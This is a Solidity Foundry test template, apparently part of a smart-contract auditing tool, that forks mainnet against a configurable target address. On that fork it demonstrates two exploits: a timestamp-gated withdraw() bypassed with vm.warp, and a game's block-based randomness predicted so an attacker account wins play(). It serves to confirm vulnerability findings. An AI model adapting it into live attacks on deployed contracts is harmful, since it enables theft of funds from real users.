// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Chain randomness + timestamp dependence
/// @notice Detectors: weak-randomness, timestamp, bytecode-timestamp.
///         The target draws "randomness" from block data (blockhash,
///         block.timestamp, block.prevrandao) or branches on
///         block.timestamp. Both are attacker-influenced: a miner/validator
///         shifts them, and anyone can predict them before playing.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt play() / the win condition /
///      unlockTime() to the target.

interface IGame {
    function play() external payable;
    function lastWinner() external view returns (address);
    function unlockTime() external view returns (uint256);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_timestampGateBypassedByWarp() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // TODO: adapt to the target's real time-gated function.
        uint256 unlock = IGame(target).unlockTime();
        require(unlock > block.timestamp, "already unlocked at this fork block");
        vm.warp(unlock + 1);

        vm.prank(attackerEOA);
        (bool ok,) = target.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw after warp ok:", ok);
        assertTrue(ok, "exploit did not reproduce: time gate still held after warp");
    }

    function test_randomnessPredicted() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // TODO: mirror the target's exact randomness formula here, then
        // play at the block/timestamp where the formula favors the caller.
        // Example shape (common): keccak256(block.timestamp, prevrandao).
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);

        vm.prank(attackerEOA);
        (bool ok,) = target.call(abi.encodeWithSignature("play()"));
        require(ok, "play() call failed -- adapt to the target's play function");

        (bool winOk, bytes memory ret) =
            target.staticcall(abi.encodeWithSignature("lastWinner()"));
        require(winOk, "target has no lastWinner() view -- adapt the win check");
        address winner = abi.decode(ret, (address));
        console.log("winner:", winner);
        assertEq(winner, attackerEOA, "exploit did not reproduce: attacker did not win at the chosen block");
    }
}
